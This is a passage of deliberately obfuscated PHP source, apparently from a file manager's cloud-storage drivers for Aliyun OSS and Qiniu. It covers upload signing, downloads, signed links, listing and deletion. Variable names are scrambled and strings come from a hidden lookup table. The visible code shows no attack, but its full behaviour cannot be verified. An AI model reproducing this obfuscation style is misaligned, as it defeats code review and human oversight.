OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Äàñú€÷))); $Ó“£Ê›å = $this->trafficLimit($®÷ã‡Äñ[1695], $Ó“£Ê›å); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($×ÙÎÈÛ§), $ä§©ÛÊÉ, $Ó“£Ê›å); } catch (OSS\Core\OssException $ìÙÜİ‡) { $this->writeLog(__FUNCTION__ . $®÷ã‡Äñ[212] . $ìÙÜİ‡->getMessage()); return !1; } return $this->getPathOuter($Äàñú€÷); } public function getHost() { $ØËöà¸® =& $_SERVER[µÅ˜º…æ]; $ÙÑéÜá = explode($ØËöà¸®[208], parent::getHost()); return $ÙÑéÜá[0] . $ØËöà¸®[208] . $this->bucket . $ØËöà¸®[10] . $ÙÑéÜá[1]; } public function uploadFormData($›€½ÄôÀ, $¤ğÛ£Ò = 3600) { $Æ®ÛàÄö =& $_SERVER[µÅ˜º…æ]; if (!($£¾´¶ˆ¶ = $this->getHost())) { return !1; } $‡µÀ£¼ä = $¤ğÛ£Ò; $ÄÈëÄÜö = date($Æ®ÛàÄö[1697], time() + $‡µÀ£¼ä); $¶›ûò•ˆ = new DateTime($ÄÈëÄÜö); $¼×ŠÔ‡® = $¶›ûò•ˆ->format(DateTime::ISO8601); $éƒ—†ƒ = strpos($¼×ŠÔ‡®, $Æ®ÛàÄö[371]); $¼×ŠÔ‡® = substr($¼×ŠÔ‡®, 0, $éƒ—†ƒ) . $Æ®ÛàÄö[1698]; $âÀ›¸¬ö = 1048576000 * 5; $‰èĞŒ» = $this->pathFather($›€½ÄôÀ); $çç…¿­ú = array($Æ®ÛàÄö[262] => $¼×ŠÔ‡®, $Æ®ÛàÄö[265] => array(array($Æ®ÛàÄö[1699], 0, $âÀ›¸¬ö), array($Æ®ÛàÄö[267], $Æ®ÛàÄö[268], $‰èĞŒ»))); $şè¦Ö„´ = base64_encode(json_encode($çç…¿­ú)); $ªçËÓ = base64_encode(hash_hmac($Æ®ÛàÄö[1525], $şè¦Ö„´, $this->secret, !0)); $õ‰Ú¦ƒ™ = array($Æ®ÛàÄö[1700] => $this->accessKey, $Æ®ÛàÄö[277] => $şè¦Ö„´, $Æ®ÛàÄö[270] => $Æ®ÛàÄö[261], $Æ®ÛàÄö[1701] => $ªçËÓ, $Æ®ÛàÄö[206] => $£¾´¶ˆ¶); $õ‰Ú¦ƒ™ = $this->trafficLimit($Æ®ÛàÄö[1695], $õ‰Ú¦ƒ™, !0); return $õ‰Ú¦ƒ™; } public function uploadMultiData($ç‘·éÍ¬, $»Ñ•›Ì = 3600) { $Ğ›²ÖÆ‹ =& $_SERVER[µÅ˜º…æ]; if (!($­óâƒù¿ = $this->getHost())) { return !1; } $üñ½éø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ç‘·éÍ¬)); return array($Ğ›²ÖÆ‹[281] => $üñ½éø, $Ğ›²ÖÆ‹[206] => $­óâƒù¿ . $Ğ›²ÖÆ‹[8] . $this->pathEncode($ç‘·éÍ¬), $Ğ›²ÖÆ‹[282] => gmdate($Ğ›²ÖÆ‹[1702]), $Ğ›²ÖÆ‹[95] => $ç‘·éÍ¬); } public function uploadMultiAuth($¼ÃÇãØá, $½…ŸõàÓ = array()) { if (isset($½…ŸõàÓ[$_SERVER[µÅ˜º…æ][283]])) { return $this->uploadPartAuth($¼ÃÇãØá, $½…ŸõàÓ); } return $this->uploadListAuth($¼ÃÇãØá, $½…ŸõàÓ); } private function uploadPartAuth($–Şô“ä¯, $ç¤½ëš = array()) { $¡ƒü‰¿ô =& $_SERVER[µÅ˜º…æ]; $ğ±ÒïıÛ = $ç¤½ëš[$¡ƒü‰¿ô[95]]; $óçå³ô = $this->_getUploadAuth($ğ±ÒïıÛ, $ç¤½ëš); $Ò“üŠ¼ = array($¡ƒü‰¿ô[286] => $óçå³ô[$¡ƒü‰¿ô[286]], $¡ƒü‰¿ô[282] => $óçå³ô[$¡ƒü‰¿ô[282]]); if (isset($óçå³ô[$¡ƒü‰¿ô[1703]])) { $Ò“üŠ¼[$¡ƒü‰¿ô[1703]] = $óçå³ô[$¡ƒü‰¿ô[1703]]; } return $Ò“üŠ¼; } private function uploadListAuth($ğØä”Á¯, $Á´¥Ñ¦Ê = array()) { $ÛØ‹¥ò¾ =& $_SERVER[µÅ˜º…æ]; $¥–„øËÒ = $Á´¥Ñ¦Ê[$ÛØ‹¥ò¾[95]]; $ÚŒà¯ú× = $Á´¥Ñ¦Ê[$ÛØ‹¥ò¾[281]]; $œÌ¾µØ = $this->client->listParts($this->bucket, $this->pathEncode($¥–„øËÒ), $ÚŒà¯ú×); $ëéİøÃĞ = $œÌ¾µØ->getListPart(); $ÔôÇ©Üò = array(); foreach ($ëéİøÃĞ as $˜šëÑˆ£) { $ÔôÇ©Üò[] = array($ÛØ‹¥ò¾[297] => $˜šëÑˆ£->getPartNumber(), $ÛØ‹¥ò¾[298] => trim($˜šëÑˆ£->getETag(), $ÛØ‹¥ò¾[118])); } if (!$ÔôÇ©Üò) { return !1; } $‘´Ë­Å = $this->_getUploadAuth($¥–„øËÒ, $Á´¥Ñ¦Ê); return array($ÛØ‹¥ò¾[286] => $‘´Ë­Å[$ÛØ‹¥ò¾[286]], $ÛØ‹¥ò¾[282] => $‘´Ë­Å[$ÛØ‹¥ò¾[282]], $ÛØ‹¥ò¾[289] => $ÔôÇ©Üò); } private function _getUploadAuth($ûØÆ÷, $õíÌéÃ³) { $ª«åÒé‘ =& $_SERVER[µÅ˜º…æ]; $¿Èü°üç = gmdate($ª«åÒé‘[1702]); $òŸå‘ø” = isset($õíÌéÃ³[$ª«åÒé‘[283]]) ? $ª«åÒé‘[253] : $ª«åÒé‘[288]; $É…Àé¶Ğ = array_intersect_key($õíÌéÃ³, array_flip(array($ª«åÒé‘[283], $ª«åÒé‘[281]))); ksort($É…Àé¶Ğ); $ÒÛ÷‘Ç± = $É…Àé¶Ğ ? $ª«åÒé‘[76] . http_build_query($É…Àé¶Ğ, null, $ª«åÒé‘[284], PHP_QUERY_RFC3986) : $ª«åÒé‘[12]; $Ü±™ŠÔÉ = array($òŸå‘ø”, $ª«åÒé‘[12], $ª«åÒé‘[120], $¿Èü°üç, "\x78\55\157\x73\163\55\144\x61\164\x65\x3a{$¿Èü°üç}", $ª«åÒé‘[8] . $this->bucket . $ª«åÒé‘[8] . $ûØÆ÷ . $ÒÛ÷‘Ç±); if (isset($õíÌéÃ³[$ª«åÒé‘[283]])) { $Ö¨ÜËÆÇ = $this->trafficLimit($ª«åÒé‘[1695], array(), !0); if ($Ö¨ÜËÆÇ) { $ûØÆ÷ = $ª«åÒé‘[1703]; array_splice($Ü±™ŠÔÉ, 5, 0, $ûØÆ÷ . $ª«åÒé‘[4] . $Ö¨ÜËÆÇ[$ûØÆ÷]); } } $®Ğ Ì‰³ = implode($ª«åÒé‘[285], $Ü±™ŠÔÉ); $§Ø˜‰ƒì = base64_encode(hash_hmac($ª«åÒé‘[1525], $®Ğ Ì‰³, $this->secret, !0)); $ãèºëœ = $ª«åÒé‘[1672] . $this->accessKey . $ª«åÒé‘[4] . $§Ø˜‰ƒì; $Ü¡·ªè = array($ª«åÒé‘[286] => $ãèºëœ, $ª«åÒé‘[282] => $¿Èü°üç); if (!empty($Ö¨ÜËÆÇ)) { $Ü¡·ªè = array_merge($Ü¡·ªè, $Ö¨ÜËÆÇ); } return $Ü¡·ªè; } public function download($»™æ½¶´, $µÅŠƒ˜œ) { $ùŠÄÏ =& $_SERVER[µÅ˜º…æ]; if ($this->isFolder($»™æ½¶´)) { return !1; } try { $™§²¥¡é = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $µÅŠƒ˜œ); $™§²¥¡é = $this->trafficLimit($ùŠÄÏ[109], $™§²¥¡é); $this->client->getObject($this->bucket, $this->pathEncode($»™æ½¶´), $™§²¥¡é); } catch (OSS\Core\OssException $¬Ìî¼¢) { $this->writeLog(__FUNCTION__ . $ùŠÄÏ[212] . $¬Ìî¼¢->getMessage()); return !1; } return $µÅŠƒ˜œ; } public function fileSubstr($ó¶óŒÀÛ, $§ñœòÆ = 0, $ä½ÙäĞ£ = false) { if ($§ñœòÆ === -1) { $ñØÔí° = array(); } else { if ($ä½ÙäĞ£ === !1) { $¯Ãäì†İ = $this->size($ó¶óŒÀÛ); } else { $¯Ãäì†İ = $§ñœòÆ + $ä½ÙäĞ£ - 1; } $ñØÔí° = array(OSS\OssClient::OSS_RANGE => "{$§ñœòÆ}\x2d{$¯Ãäì†İ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ó¶óŒÀÛ), $ñØÔí°); } catch (OSS\Core\OssException $Å»¢ÎÆ«) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][212] . $Å»¢ÎÆ«->getMessage()); think_exception($Å»¢ÎÆ«->getMessage()); return !1; } } private function trafficLimit($¿¼±Ç§Ü, $¢ò‡Ï• = array(), $ôş´íì = false) { $Ÿšİùâ =& $_SERVER[µÅ˜º…æ]; if ($¿¼±Ç§Ü == $Ÿšİùâ[1695] && $this->isUploadServer() || $¿¼±Ç§Ü == $Ÿšİùâ[109] && $this->isFileOutServer()) { return $¢ò‡Ï•; } $ö¥Ä’¥º = floatval($GLOBALS[$Ÿšİùâ[6]][$Ÿšİùâ[92]][$Ÿšİùâ[107]][$¿¼±Ç§Ü]) * 1024 * 1024 * 8; if (!$ö¥Ä’¥º) { return $¢ò‡Ï•; } $ö¥Ä’¥º = $ö¥Ä’¥º < 819200 ? 819200 : ($ö¥Ä’¥º > 838860800 ? 838860800 : $ö¥Ä’¥º); if ($ôş´íì) { $¢ò‡Ï•[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ö¥Ä’¥º); } else { if (!isset($¢ò‡Ï•[OSS\OssClient::OSS_HEADERS])) { $¢ò‡Ï•[OSS\OssClient::OSS_HEADERS] = array(); } $¢ò‡Ï•[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ö¥Ä’¥º); } return $¢ò‡Ï•; } public function link($ä‹ĞüãŞ, $ŒÑŒùûü = array()) { $çààøºÊ =& $_SERVER[µÅ˜º…æ]; if (!$this->exist($ä‹ĞüãŞ) || $this->isFolder($ä‹ĞüãŞ)) { return !1; } try { $ŒÑŒùûü = $this->trafficLimit($çààøºÊ[109], $ŒÑŒùûü, !0); $ê•èèúÓ = $this->client->signUrl($this->bucket, $this->pathEncode($ä‹ĞüãŞ), 3600 * 12, $çààøºÊ[1606], $ŒÑŒùûü); return $this->getCdnLink($ê•èèúÓ); } catch (OSS\Core\OssException $ô¾æ’­š) { $this->writeLog(__FUNCTION__ . $çààøºÊ[212] . $ô¾æ’­š->getMessage()); return !1; } } public function fileOut($»Ã©ëĞ, $ÉÙÙ¡É = false, $úÓø” = false, $œÓ¾Ìõ = '') { $ôõƒŒáû =& $_SERVER[µÅ˜º…æ]; if ($this->isFileOutServer()) { return $this->fileOutServer($»Ã©ëĞ, $ÉÙÙ¡É, $úÓø”, $œÓ¾Ìõ); } if (!$úÓø”) { $úÓø” = $this->pathThis($»Ã©ëĞ); } $úÓø” = rawurlencode($úÓø”); $Á­ÅˆĞ€ = get_file_mime(get_path_ext($úÓø”)); if ($Á­ÅˆĞ€ == $ôõƒŒáû[248]) { return parent::fileOut($»Ã©ëĞ, $ÉÙÙ¡É, $úÓø”, $œÓ¾Ìõ); } $ÉÙÙ¡É = $ÉÙÙ¡É ? $ôõƒŒáû[1704] : $ôõƒŒáû[1705]; $êŒ…¨”Æ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ôõƒŒáû[1706] . rawurlencode("{$ÉÙÙ¡É}\x3b\146\151\154\x65\156\x61\x6d\x65\75{$úÓø”}")); $Õã³ÎËë = $this->link($»Ã©ëĞ, $êŒ…¨”Æ); $this->fileOutLink($Õã³ÎËë); } public function fileOutServer($ùİşÂù, $ä˜’¯ù = false, $„ªù¶¬¦ = false, $±Ùè÷‚Á = '') { parent::fileOut($ùİşÂù, $ä˜’¯ù, $„ªù¶¬¦, $±Ùè÷‚Á); } public function fileOutImage($Íöè—õÇ, $¿‡’ñ± = 250) { if ($this->size($Íöè—õÇ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Íöè—õÇ, $¿‡’ñ±); } $½“ø÷›Ï = array(OSS\OssClient::OSS_PROCESS => $_SERVER[µÅ˜º…æ][1669] . $¿‡’ñ±); $¹éåÎğÍ = $this->link($Íöè—õÇ, $½“ø÷›Ï); $this->fileOutLink($¹éåÎğÍ); } public function fileOutImageServer($¼ôÅÏìÎ, $¦…—Ï¼¨ = 250) { parent::fileOutImage($¼ôÅÏìÎ, $¦…—Ï¼¨); } public function fileOutLink($ÅÖ¦µş©) { $½ö‘Ú =& $_SERVER[µÅ˜º…æ]; if (!$this->isCdnHost() && substr($ÅÖ¦µş©, 0, 7) == $½ö‘Ú[216]) { $ÅÖ¦µş© = $½ö‘Ú[217] . substr($ÅÖ¦µş©, 7); } header($½ö‘Ú[172] . $ÅÖ¦µş©); die; } public function hashMd5($ñı»éî—, $å¹ïü· = '') { $Íßîúã =& $_SERVER[µÅ˜º…æ]; $ ·îñÓõ = $this->_objectMeta($ñı»éî—); if (!$ ·îñÓõ) { return $Íßîúã[12]; } if (!isset($ ·îñÓõ[$Íßîúã[1689]]) && !empty($å¹ïü·)) { $ËÍšÕÑá = $this->updateObjMeta($ñı»éî—, array($Íßîúã[1689] => $å¹ïü·)); $ ·îñÓõ[$Íßîúã[1689]] = $ËÍšÕÑá ? $å¹ïü· : $Íßîúã[12]; } return isset($ ·îñÓõ[$Íßîúã[1689]]) ? strtolower($ ·îñÓõ[$Íßîúã[1689]]) : $Íßîúã[12]; } public function size($èÅºÄãø) { $³Ôûš´™ = $this->objectMeta($èÅºÄãø); return $³Ôûš´™ ? $³Ôûš´™[$_SERVER[µÅ˜º…æ][79]] : 0; } public function info($˜‹Ë£÷) { if ($this->isFolder($˜‹Ë£÷)) { return $this->folderInfo($˜‹Ë£÷); } else { if ($this->isFile($˜‹Ë£÷)) { return $this->fileInfo($˜‹Ë£÷); } } return !1; } public function exist($«³ÖÜÎ) { return $this->isFile($«³ÖÜÎ) || $this->isFolder($«³ÖÜÎ); } public function isFile($ùôÇ¼„) { return !$this->isFolder($ùôÇ¼„) && $this->objectMeta($ùôÇ¼„); } public function isFolder($›‘ˆÓŞõ) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][177], $›‘ˆÓŞõ); } protected function objectMeta($±Í’ê¡ı) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][179], $±Í’ê¡ı); } protected function _objectMeta($·úÂ³æ) { $Ó•¦ëùÎ =& $_SERVER[µÅ˜º…æ]; try { $Ş¨úøŸÌ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($·úÂ³æ)); } catch (OSS\Core\OssException $µ÷òŞçº) { $this->writeLog(__FUNCTION__ . $Ó•¦ëùÎ[212] . $µ÷òŞçº->getMessage()); $Ş¨úøŸÌ = !1; } if ($Ş¨úøŸÌ) { $Ş¨úøŸÌ[$Ó•¦ëùÎ[79]] = intval($Ş¨úøŸÌ[$Ó•¦ëùÎ[1687]]); } return $Ş¨úøŸÌ; } protected function _isFolder($öù™„) { $ıšèÜÉõ =& $_SERVER[µÅ˜º…æ]; if ($öù™„ == $ıšèÜÉõ[12] || $öù™„ == $ıšèÜÉõ[8]) { return !0; } $’ì¬œ•™ = array($ıšèÜÉõ[1682] => $ıšèÜÉõ[8], $ıšèÜÉõ[1683] => rtrim($öù™„, $ıšèÜÉõ[8]) . $ıšèÜÉõ[8], $ıšèÜÉõ[1684] => 1, $ıšèÜÉõ[1685] => $ıšèÜÉõ[12]); $ÊĞùìäí = $this->client->listObjects($this->bucket, $’ì¬œ•™); if ($ÊĞùìäí->getObjectList() || $ÊĞùìäí->getPrefixList()) { return !0; } return !1; } public function writeLog($šÇï–¤ç = '', $®åÏÚæî = false) { $şŒ®ñ”¬ =& $_SERVER[µÅ˜º…æ]; $µÂüßŸ = in_array(ACTION, array($şŒ®ñ”¬[210], $şŒ®ñ”¬[211])); if (!$µÂüßŸ && !GLOBAL_DEBUG) { return; } $Í“°“ûÔ = 0; if (stripos($šÇï–¤ç, $şŒ®ñ”¬[1707]) !== !1) { $Í“°“ûÔ = 1; $Ò‚’ßÚƒ = explode($şŒ®ñ”¬[1708], $šÇï–¤ç); $šÇï–¤ç = !empty($Ò‚’ßÚƒ[1]) ? $Ò‚’ßÚƒ[1] : $šÇï–¤ç; } else { if (stripos($šÇï–¤ç, $şŒ®ñ”¬[1709])) { $Í“°“ûÔ = 2; $Ò‚’ßÚƒ = explode($şŒ®ñ”¬[1709], $šÇï–¤ç); $Ò‚’ßÚƒ = explode($şŒ®ñ”¬[4], $Ò‚’ßÚƒ[0]); $šÇï–¤ç = !empty($Ò‚’ßÚƒ[1]) ? $Ò‚’ßÚƒ[1] : $šÇï–¤ç; } } if ($µÂüßŸ && I18n::getType() == $şŒ®ñ”¬[1710]) { if ($Í“°“ûÔ == 1) { $šÇï–¤ç = str_replace($şŒ®ñ”¬[1711], $şŒ®ñ”¬[1712], $šÇï–¤ç); } else { if ($Í“°“ûÔ == 2) { $Ò‚’ßÚƒ = explode($şŒ®ñ”¬[212], $Ò‚’ßÚƒ[0]); $Ù­´÷˜ = isset($Ò‚’ßÚƒ[1]) ? $Ò‚’ßÚƒ[1] : $şŒ®ñ”¬[12]; $ ›äì½¼ = array($şŒ®ñ”¬[1713] => $şŒ®ñ”¬[1714], $şŒ®ñ”¬[1715] => $şŒ®ñ”¬[1716], $şŒ®ñ”¬[1717] => $şŒ®ñ”¬[1718], $şŒ®ñ”¬[1719] => $şŒ®ñ”¬[1720], $şŒ®ñ”¬[1721] => $şŒ®ñ”¬[1722], $şŒ®ñ”¬[1723] => $şŒ®ñ”¬[1724], $şŒ®ñ”¬[1725] => $şŒ®ñ”¬[1726], $şŒ®ñ”¬[1727] => $şŒ®ñ”¬[1728], $şŒ®ñ”¬[1729] => $şŒ®ñ”¬[1730], $şŒ®ñ”¬[1731] => $şŒ®ñ”¬[1732]); if (isset($ ›äì½¼[$Ù­´÷˜])) { $šÇï–¤ç = $ ›äì½¼[$Ù­´÷˜]; } } } if (stripos($šÇï–¤ç, $şŒ®ñ”¬[1733])) { $šÇï–¤ç = $şŒ®ñ”¬[1734]; } } if (!trim($šÇï–¤ç)) { return; } parent::writeLog(trim($šÇï–¤ç), $®åÏÚæî); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($£ØŠœ‘ß) { parent::__construct(); require_once SDK_DIR . $_SERVER[µÅ˜º…æ][1735]; $this->_init($£ØŠœ‘ß); } public function _init($Ö±³¿×…) { $şÚ†Ô =& $_SERVER[µÅ˜º…æ]; $this->config = $Ö±³¿×…; foreach ($Ö±³¿×… as $ƒ±®™”ò => $éÁ˜ƒ†Š) { if (isset($this->{$ƒ±®™”ò})) { $this->{$ƒ±®™”ò} = $éÁ˜ƒ†Š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($şÚ†Ô[1736] . LNG($şÚ†Ô[1673])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¦ÉêØÓ®, $ÀÅ¤éŞ = '', $­åÃú‹è = REPEAT_RENAME) { if ($this->setContent($¦ÉêØÓ®, $ÀÅ¤éŞ)) { return $this->getPathOuter($¦ÉêØÓ®); } return !1; } public function mkdir($Öòºêô÷, $Ú·Ì¨Ñ = REPEAT_SKIP) { $ä¡ÎÏ¶Œ =& $_SERVER[µÅ˜º…æ]; $Ò×âÔÊñ = trim($Öòºêô÷, $ä¡ÎÏ¶Œ[8]); if ($this->_isFolder($Ò×âÔÊñ)) { return $this->getPathOuter($Ò×âÔÊñ); } $Öòºêô÷ = $Ò×âÔÊñ . $ä¡ÎÏ¶Œ[8]; $«¼¼¿èä = get_path_this($Ò×âÔÊñ); $Åœ´¨Ù = $Öòºêô÷ . $«¼¼¿èä; if (!$this->mkfile($Åœ´¨Ù)) { return !1; } if (!$this->moveFile($Åœ´¨Ù, $Öòºêô÷)) { $this->delFile($Åœ´¨Ù); return !1; } return $this->getPathOuter($Ò×âÔÊñ); } public function copyFile($¬‚»¡ô£, $‰Ñ¸º) { $óûÖ³‰ø = $this->bucketManager->copy($this->bucket, $¬‚»¡ô£, $this->bucket, $‰Ñ¸º, !0); return $óûÖ³‰ø ? !1 : $this->getPathOuter($‰Ñ¸º); } public function moveFile($Ş´ñŞÁ, $ì„ŸÚ„×) { $ãìâ«şŸ = $this->bucketManager->move($this->bucket, $Ş´ñŞÁ, $this->bucket, $ì„ŸÚ„×, !0); return $ãìâ«şŸ ? !1 : $this->getPathOuter($ì„ŸÚ„×); } public function delFile($ôé§´şô) { if (!$this->exist($ôé§´şô)) { return !0; } $Ô‚µÏ¬™ = $this->bucketManager->delete($this->bucket, $ôé§´şô); if (!$Ô‚µÏ¬™) { return !0; } return $Ô‚µÏ¬™->code() == 612 ? !0 : !1; } public function delFolder($¢É°–®ş) { $ÀğšöÈÆ =& $_SERVER[µÅ˜º…æ]; if (!$this->exist($¢É°–®ş)) { return !0; } $this->listItemCache = !1; $ø“ü¼õÄ = $this->fileList($¢É°–®ş); $this->listItemCache = !0; $¦¶³è™– = trim($¢É°–®ş, $ÀğšöÈÆ[8]) . $ÀğšöÈÆ[8]; if (!empty($¢É°–®ş) && $¢É°–®ş !== $ÀğšöÈÆ[228] && !in_array($¦¶³è™–, $ø“ü¼õÄ[$ÀğšöÈÆ[85]])) { $ø“ü¼õÄ[$ÀğšöÈÆ[85]][] = $¦¶³è™–; } $¥ÓÎÚ¡Õ = $this->delByBatch($ø“ü¼õÄ[$ÀğšöÈÆ[86]]); if (!$¥ÓÎÚ¡Õ) { return !1; } $¥ÓÎÚ¡Õ = $this->delByBatch($ø“ü¼õÄ[$ÀğšöÈÆ[85]]); if (!$¥ÓÎÚ¡Õ) { return !1; } return $this->delFile($¦¶³è™–); } private function delByBatch($¼²©äéü) { foreach (array_chunk($¼²©äéü, 1000) as $İ¿ÆÄâ) { $÷¢‚¶ = $this->bucketManager->buildBatchDelete($this->bucket, $İ¿ÆÄâ); list($…Şˆæú, $§äó›§‡) = $this->bucketManager->batch($÷¢‚¶); if ($§äó›§‡) { return !1; } } return !0; } public function rename($üİ¯ÌŞ, $ÊÙœ‚¥) { return $this->renameObject($üİ¯ÌŞ, $ÊÙœ‚¥); } public function fileInfo($ñøò§æ¬, $”¢Ë’‡ñ = false, $—ù¯ğ½× = array()) { $ÃˆîùÒ— =& $_SERVER[µÅ˜º…æ]; $ñ¸ëÃ«¤ = array($ÃˆîùÒ—[32] => $this->pathThis($ñøò§æ¬), $ÃˆîùÒ—[87] => $this->getPathOuter($ÃˆîùÒ—[8] . $ñøò§æ¬), $ÃˆîùÒ—[33] => $ÃˆîùÒ—[230], $ÃˆîùÒ—[79] => isset($—ù¯ğ½×[$ÃˆîùÒ—[1737]]) ? $—ù¯ğ½×[$ÃˆîùÒ—[1737]] : 0, $ÃˆîùÒ—[166] => $this->ext($ñøò§æ¬)); if ($”¢Ë’‡ñ) { return $ñ¸ëÃ«¤; } $ñ¸ëÃ«¤[$ÃˆîùÒ—[231]] = $ñ¸ëÃ«¤[$ÃˆîùÒ—[88]] = 0; $ñ¸ëÃ«¤[$ÃˆîùÒ—[232]] = $ñ¸ëÃ«¤[$ÃˆîùÒ—[233]] = !0; if (empty($—ù¯ğ½×)) { $—ù¯ğ½× = $this->objectMeta($ñøò§æ¬); if (!$—ù¯ğ½×) { return $ñ¸ëÃ«¤; } } if (isset($—ù¯ğ½×[$ÃˆîùÒ—[234]]) && $—ù¯ğ½×[$ÃˆîùÒ—[234]]) { $ñ¸ëÃ«¤[$ÃˆîùÒ—[235]] = $—ù¯ğ½×[$ÃˆîùÒ—[234]]; } if (isset($—ù¯ğ½×[$ÃˆîùÒ—[245]]) && $—ù¯ğ½×[$ÃˆîùÒ—[245]]) { $ñ¸ëÃ«¤[$ÃˆîùÒ—[235]] = $—ù¯ğ½×[$ÃˆîùÒ—[245]]; } if (isset($—ù¯ğ½×[$ÃˆîùÒ—[1738]])) { $ñ¸ëÃ«¤[$ÃˆîùÒ—[88]] = substr($—ù¯ğ½×[$ÃˆîùÒ—[1738]] . $ÃˆîùÒ—[12], 0, 10); } if (isset($—ù¯ğ½×[$ÃˆîùÒ—[1737]])) { $ñ¸ëÃ«¤[$ÃˆîùÒ—[79]] = $—ù¯ğ½×[$ÃˆîùÒ—[1737]]; } return $ñ¸ëÃ«¤; } public function folderInfo($¹üÙ¢á, $©¹²Æªº = false) { $Ü Äƒ–Û =& $_SERVER[µÅ˜º…æ]; $¦ıÉïŒ¼ = array($Ü Äƒ–Û[32] => $this->pathThis($¹üÙ¢á), $Ü Äƒ–Û[87] => $this->getPathOuter($Ü Äƒ–Û[8] . $¹üÙ¢á), $Ü Äƒ–Û[33] => $Ü Äƒ–Û[78]); if ($©¹²Æªº) { return $¦ıÉïŒ¼; } $¦ıÉïŒ¼[$Ü Äƒ–Û[231]] = $¦ıÉïŒ¼[$Ü Äƒ–Û[88]] = 0; $¦ıÉïŒ¼[$Ü Äƒ–Û[232]] = $¦ıÉïŒ¼[$Ü Äƒ–Û[233]] = !0; $¹üÙ¢á = rtrim($¹üÙ¢á, $Ü Äƒ–Û[8]) . $Ü Äƒ–Û[8]; $Ø»¹ùÊ = $this->objectMeta($¹üÙ¢á); if (isset($Ø»¹ùÊ[$Ü Äƒ–Û[1738]])) { $¦ıÉïŒ¼[$Ü Äƒ–Û[88]] = substr($Ø»¹ùÊ[$Ü Äƒ–Û[1738]] . $Ü Äƒ–Û[12], 0, 10); } return $¦ıÉïŒ¼; } public function listPath($ƒ¤×½Ÿ, $ºñ‘âŸö = false) { $œË­Ûö =& $_SERVER[µÅ˜º…æ]; $¼¬¼–ŒÏ = $this->fileList($ƒ¤×½Ÿ, $œË­Ûö[8], !0); foreach ($¼¬¼–ŒÏ[$œË­Ûö[85]] as $ŞˆÄ—È˜ => $‚Ï×Öî) { $¼¬¼–ŒÏ[$œË­Ûö[85]][$ŞˆÄ—È˜] = $this->folderInfo($‚Ï×Öî, $ºñ‘âŸö); } foreach ($¼¬¼–ŒÏ[$œË­Ûö[86]] as $ŞˆÄ—È˜ => $‚Ï×Öî) { $¼¬¼–ŒÏ[$œË­Ûö[86]][$ŞˆÄ—È˜] = $this->fileInfo($‚Ï×Öî[$œË­Ûö[32]], $ºñ‘âŸö, $‚Ï×Öî); } return $¼¬¼–ŒÏ; } public function has($âĞşï š, $»Ä—•ÆÅ = false, $–›Šş·Œ = true) { $™©Š€åİ =& $_SERVER[µÅ˜º…æ]; $âĞşï š = trim($âĞşï š, $™©Š€åİ[8]); $­ì—Ôâ = empty($âĞşï š) && $âĞşï š !== $™©Š€åİ[228] ? $™©Š€åİ[12] : $âĞşï š . $™©Š€åİ[8]; $‘éæ¤“« = $™©Š€åİ[12]; $ãÕÖ­©  = 500; $§µÉâ¶» = $™©Š€åİ[8]; $í¹¬öÜ = $»„Äñ¬ö = 0; while (!0) { check_abort(); list($×ê¡ˆò¹, $ŸĞù¼Ñ) = $this->bucketManager->listFiles($this->bucket, $­ì—Ôâ, $‘éæ¤“«, $ãÕÖ­© , $§µÉâ¶»); if ($ŸĞù¼Ñ) { break; } $‘éæ¤“« = array_key_exists($™©Š€åİ[1685], $×ê¡ˆò¹) ? $‘éæ¤“« = $×ê¡ˆò¹[$™©Š€åİ[1739]] : $™©Š€åİ[12]; if ($»Ä—•ÆÅ) { if (!empty($×ê¡ˆò¹[$™©Š€åİ[1740]])) { $í¹¬öÜ += count($×ê¡ˆò¹[$™©Š€åİ[1740]]); } if (!empty($×ê¡ˆò¹[$™©Š€åİ[1741]])) { $»„Äñ¬ö += count($×ê¡ˆò¹[$™©Š€åİ[1741]]); } if ($‘éæ¤“« === $™©Š€åİ[12]) { break; } continue; } if ($–›Šş·Œ) { if (!empty($×ê¡ˆò¹[$™©Š€åİ[1740]])) { return !0; } } else { if (!empty($×ê¡ˆò¹[$™©Š€åİ[1741]])) { return !0; } } if ($‘éæ¤“« === $™©Š€åİ[12]) { break; } } if ($»Ä—•ÆÅ) { return array($™©Š€åİ[239] => $í¹¬öÜ, $™©Š€åİ[240] => $»„Äñ¬ö); } return !1; } public function listAll($÷çĞÇ¸) { $ŸÓâ‰Ãƒ =& $_SERVER[µÅ˜º…æ]; $Êã™ñÅ = $this->fileList($÷çĞÇ¸, $ŸÓâ‰Ãƒ[12], !0); $§ŠÓËÑ¤ = array_to_keyvalue($Êã™ñÅ[$ŸÓâ‰Ãƒ[86]], $ŸÓâ‰Ãƒ[32]); foreach ($Êã™ñÅ[$ŸÓâ‰Ãƒ[85]] as $¬å°ˆÉÎ) { if (is_string($¬å°ˆÉÎ)) { $§ŠÓËÑ¤[$¬å°ˆÉÎ] = array($ŸÓâ‰Ãƒ[79] => 0); } } return $this->listAllFiles($÷çĞÇ¸, $§ŠÓËÑ¤); } private function fileList($€ÒîÇ¦Ü, $™îÅø¤ = '', $§¢°—À® = 0) { $µ×——öâ =& $_SERVER[µÅ˜º…æ]; $€ÒîÇ¦Ü = 